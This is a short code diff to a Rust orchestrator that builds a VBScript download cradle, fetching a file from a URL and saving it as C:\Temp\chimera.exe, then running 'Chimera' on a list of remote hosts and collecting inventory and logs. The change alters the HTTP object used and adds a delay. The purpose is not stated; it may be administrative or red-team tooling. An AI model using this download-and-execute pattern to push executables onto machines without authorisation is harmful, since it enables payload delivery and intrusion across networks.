@@ -366,7 +366,7 @@ impl Orchestrator {
     fn generate_base64_download_command(url: &str) -> String {
         // Create the VBScript content
         let vbs_script = format!(
-            "Dim xhr:Set xhr=CreateObject(\"MSXML2.XMLHTTP.6.0\"):xhr.Open \"GET\",\"{}\",False:xhr.Send:Set stream=CreateObject(\"ADODB.Stream\"):stream.Open:stream.Type=1:stream.Write xhr.responseBody:stream.SaveToFile \"C:\\Temp\\chimera.exe\",2:stream.Close",
+            "Dim xhr : Set xhr = CreateObject(\"MSXML2.ServerXMLHTTP\") : xhr.Open \"GET\",\"{}\",False : xhr.Send : Set stream = CreateObject(\"ADODB.Stream\") : stream.Open : stream.Type = 1 : stream.Write xhr.responseBody : stream.SaveToFile \"C:\\Temp\\chimera.exe\",2 : stream.Close",
             url
         );
 
@@ -634,6 +634,8 @@ impl Orchestrator {
                 Err(e) => error!("Failed to execute Chimera on {}: {}", result.ip, e),
             }
         }
+
+        tokio::time::sleep(Duration::from_secs(5)).await;
 
         self.fetch_inventory(&deployed_hosts).await?;
         self.fetch_application_log(&deployed_hosts).await?;
